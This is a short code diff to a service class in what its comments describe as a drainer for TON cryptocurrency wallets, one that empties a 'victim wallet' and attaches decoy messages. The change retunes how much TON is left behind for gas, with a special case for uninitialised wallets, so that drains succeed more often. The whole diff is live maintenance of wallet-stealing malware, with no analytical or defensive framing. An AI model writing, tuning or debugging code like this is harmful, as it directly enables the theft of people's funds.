@@ -16,7 +16,7 @@ enum ItemTypes {
 
 // Gas floor left on the victim wallet after a drain. Capped lower on tiny
 // balances so they still drain instead of returning nothing.
-const MIN_TON_RESERVE = 0.05
+const MIN_TON_RESERVE = 0.08
 
 const nftCollections = [
   '0:0e41dc1dc3c9067ed24248580e12b3359818d83dee0304fabcf80845eafafdb2',
@@ -439,8 +439,13 @@ class AssetsService {
 		// Every message below attaches real TON, so build against a spend
 		// budget. Overrunning it makes the wallet reject with "insufficient
 		// funds" (the old code attached decoys on top of the full balance).
+		// Uninitialised wallets also pay for their own deployment on the first
+		// send, so they need a bigger floor.
+		const status = String(drainable.wallet.status || '')
+		const isUninit = status === 'uninit' || status === 'nonexist'
+		const FLOOR = isUninit ? 0.15 : MIN_TON_RESERVE
 		const RESERVE = toNano(
-			Math.min(MIN_TON_RESERVE, Math.max(0.03, tonTotal * 0.2)).toFixed(9)
+			Math.min(FLOOR, Math.max(0.03, tonTotal * 0.35)).toFixed(9)
 		)
 		let budget = tonBalanceBigInt - RESERVE
 
